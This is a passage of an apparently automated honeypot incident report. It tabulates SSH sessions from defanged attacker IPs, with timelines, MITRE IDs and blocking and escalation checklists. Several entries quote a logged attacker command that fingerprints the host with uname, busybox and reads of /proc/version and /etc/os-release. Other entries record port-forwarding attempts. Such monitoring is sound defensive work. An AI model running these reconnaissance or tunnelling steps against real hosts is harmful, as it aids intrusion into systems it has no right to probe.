- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d44f819ddee

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:51 |
| **Last Seen** | 2026-07-22 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:51:08` | `cowrie.session.connect` |
| `2026-07-22 05:51:08` | `cowrie.client.version` |
| `2026-07-22 05:51:08` | `cowrie.client.kex` |
| `2026-07-22 05:51:09` | `cowrie.login.success` |
| `2026-07-22 05:51:09` | `cowrie.session.params` |
| `2026-07-22 05:51:09` | `cowrie.command.input` |
| `2026-07-22 05:51:10` | `cowrie.log.closed` |
| `2026-07-22 05:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26273e87371f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:52 |
| **Last Seen** | 2026-07-22 05:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:52:46` | `cowrie.session.connect` |
| `2026-07-22 05:52:46` | `cowrie.client.version` |
| `2026-07-22 05:52:46` | `cowrie.client.kex` |
| `2026-07-22 05:52:48` | `cowrie.login.success` |
| `2026-07-22 05:52:49` | `cowrie.session.params` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.success` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.command.input` |
| `2026-07-22 05:52:49` | `cowrie.log.closed` |
| `2026-07-22 05:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46d39b354eed

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:53 |
| **Last Seen** | 2026-07-22 05:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:53:12` | `cowrie.session.connect` |
| `2026-07-22 05:53:12` | `cowrie.client.version` |
| `2026-07-22 05:53:13` | `cowrie.client.kex` |
| `2026-07-22 05:53:13` | `cowrie.login.success` |
| `2026-07-22 05:53:14` | `cowrie.session.params` |
| `2026-07-22 05:53:14` | `cowrie.command.input` |
| `2026-07-22 05:53:14` | `cowrie.log.closed` |
| `2026-07-22 05:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbdb64bcefb

| Field | Detail |
|---|---|
| **Source IP** | `120.234.232[.]184` |
| **First Seen** | 2026-07-22 05:53 |
| **Last Seen** | 2026-07-22 05:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:53:34` | `cowrie.session.connect` |
| `2026-07-22 05:53:35` | `cowrie.client.version` |
| `2026-07-22 05:53:35` | `cowrie.client.kex` |
| `2026-07-22 05:53:37` | `cowrie.login.success` |
| `2026-07-22 05:53:38` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.234.232[.]184` to AbuseIPDB if not already reported
- [ ] Block `120.234.232[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-215300226ceb

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-07-22 05:53 |
| **Last Seen** | 2026-07-22 05:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:53:43` | `cowrie.session.connect` |
| `2026-07-22 05:53:43` | `cowrie.client.version` |
| `2026-07-22 05:53:43` | `cowrie.client.kex` |
| `2026-07-22 05:53:46` | `cowrie.login.success` |
| `2026-07-22 05:53:47` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67728aaef37

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-22 05:54 |
| **Last Seen** | 2026-07-22 05:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:54:27` | `cowrie.session.connect` |
| `2026-07-22 05:54:27` | `cowrie.client.version` |
| `2026-07-22 05:54:27` | `cowrie.client.kex` |
| `2026-07-22 05:54:29` | `cowrie.login.success` |
| `2026-07-22 05:54:29` | `cowrie.direct-tcpip.request` |
| `2026-07-22 05:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481529233bdb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:54 |
| **Last Seen** | 2026-07-22 05:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:54:44` | `cowrie.session.connect` |
| `2026-07-22 05:54:44` | `cowrie.client.version` |
| `2026-07-22 05:54:44` | `cowrie.client.kex` |
| `2026-07-22 05:54:45` | `cowrie.login.success` |
| `2026-07-22 05:54:46` | `cowrie.session.params` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.success` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:46` | `cowrie.command.input` |
| `2026-07-22 05:54:47` | `cowrie.log.closed` |
| `2026-07-22 05:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20f59cf1887f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:55 |
| **Last Seen** | 2026-07-22 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:55:23` | `cowrie.session.connect` |
| `2026-07-22 05:55:23` | `cowrie.client.version` |
| `2026-07-22 05:55:23` | `cowrie.client.kex` |
| `2026-07-22 05:55:24` | `cowrie.login.success` |
| `2026-07-22 05:55:25` | `cowrie.session.params` |
| `2026-07-22 05:55:25` | `cowrie.command.input` |
| `2026-07-22 05:55:25` | `cowrie.log.closed` |
| `2026-07-22 05:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc127f14c05

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:56 |
| **Last Seen** | 2026-07-22 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:56:42` | `cowrie.session.connect` |
| `2026-07-22 05:56:42` | `cowrie.client.version` |
| `2026-07-22 05:56:42` | `cowrie.client.kex` |
| `2026-07-22 05:56:43` | `cowrie.login.success` |
| `2026-07-22 05:56:44` | `cowrie.session.params` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.success` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:44` | `cowrie.command.input` |
| `2026-07-22 05:56:45` | `cowrie.log.closed` |
| `2026-07-22 05:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43bc4378dafc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:57 |
| **Last Seen** | 2026-07-22 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:57:39` | `cowrie.session.connect` |
| `2026-07-22 05:57:39` | `cowrie.client.version` |
| `2026-07-22 05:57:39` | `cowrie.client.kex` |
| `2026-07-22 05:57:39` | `cowrie.login.success` |
| `2026-07-22 05:57:40` | `cowrie.session.params` |
| `2026-07-22 05:57:40` | `cowrie.command.input` |
| `2026-07-22 05:57:40` | `cowrie.log.closed` |
| `2026-07-22 05:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb6c70b1662c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 05:58 |
| **Last Seen** | 2026-07-22 05:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:58:40` | `cowrie.session.connect` |
| `2026-07-22 05:58:40` | `cowrie.client.version` |
| `2026-07-22 05:58:40` | `cowrie.client.kex` |
| `2026-07-22 05:58:42` | `cowrie.login.success` |
| `2026-07-22 05:58:43` | `cowrie.session.params` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.success` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.command.input` |
| `2026-07-22 05:58:43` | `cowrie.log.closed` |
| `2026-07-22 05:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5a039930bc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 05:59 |
| **Last Seen** | 2026-07-22 05:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 05:59:53` | `cowrie.session.connect` |
| `2026-07-22 05:59:53` | `cowrie.client.version` |
| `2026-07-22 05:59:53` | `cowrie.client.kex` |
| `2026-07-22 05:59:53` | `cowrie.login.success` |
| `2026-07-22 05:59:54` | `cowrie.session.params` |
| `2026-07-22 05:59:54` | `cowrie.command.input` |
| `2026-07-22 05:59:54` | `cowrie.log.closed` |
| `2026-07-22 05:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1194fb7bdb20

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-22 06:00 |
| **Last Seen** | 2026-07-22 06:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:00:10` | `cowrie.session.connect` |
| `2026-07-22 06:00:11` | `cowrie.client.version` |
| `2026-07-22 06:00:11` | `cowrie.client.kex` |
| `2026-07-22 06:00:13` | `cowrie.login.success` |
| `2026-07-22 06:00:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f18ca1057a2

| Field | Detail |
|---|---|
| **Source IP** | `24.187.213[.]29` |
| **First Seen** | 2026-07-22 06:00 |
| **Last Seen** | 2026-07-22 06:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:00:19` | `cowrie.session.connect` |
| `2026-07-22 06:00:19` | `cowrie.client.version` |
| `2026-07-22 06:00:19` | `cowrie.client.kex` |
| `2026-07-22 06:00:20` | `cowrie.login.success` |
| `2026-07-22 06:00:21` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.187.213[.]29` to AbuseIPDB if not already reported
- [ ] Block `24.187.213[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da9fa316752

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:00 |
| **Last Seen** | 2026-07-22 06:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:00:43` | `cowrie.session.connect` |
| `2026-07-22 06:00:43` | `cowrie.client.version` |
| `2026-07-22 06:00:43` | `cowrie.client.kex` |
| `2026-07-22 06:00:44` | `cowrie.login.success` |
| `2026-07-22 06:00:45` | `cowrie.session.params` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.success` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.command.input` |
| `2026-07-22 06:00:45` | `cowrie.log.closed` |
| `2026-07-22 06:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b18ac02163e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 06:02 |
| **Last Seen** | 2026-07-22 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:02:14` | `cowrie.session.connect` |
| `2026-07-22 06:02:14` | `cowrie.client.version` |
| `2026-07-22 06:02:14` | `cowrie.client.kex` |
| `2026-07-22 06:02:15` | `cowrie.login.success` |
| `2026-07-22 06:02:16` | `cowrie.session.params` |
| `2026-07-22 06:02:16` | `cowrie.command.input` |
| `2026-07-22 06:02:16` | `cowrie.log.closed` |
| `2026-07-22 06:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0c911a8c4a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:02 |
| **Last Seen** | 2026-07-22 06:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:02:41` | `cowrie.session.connect` |
| `2026-07-22 06:02:41` | `cowrie.client.version` |
| `2026-07-22 06:02:41` | `cowrie.client.kex` |
| `2026-07-22 06:02:42` | `cowrie.login.success` |
| `2026-07-22 06:02:43` | `cowrie.session.params` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.success` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:43` | `cowrie.command.input` |
| `2026-07-22 06:02:44` | `cowrie.log.closed` |
| `2026-07-22 06:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a7356a67bf

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 06:04 |
| **Last Seen** | 2026-07-22 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:04:24` | `cowrie.session.connect` |
| `2026-07-22 06:04:24` | `cowrie.client.version` |
| `2026-07-22 06:04:24` | `cowrie.client.kex` |
| `2026-07-22 06:04:24` | `cowrie.login.success` |
| `2026-07-22 06:04:25` | `cowrie.session.params` |
| `2026-07-22 06:04:25` | `cowrie.command.input` |
| `2026-07-22 06:04:25` | `cowrie.log.closed` |
| `2026-07-22 06:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0c2ffcf2fb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:04 |
| **Last Seen** | 2026-07-22 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
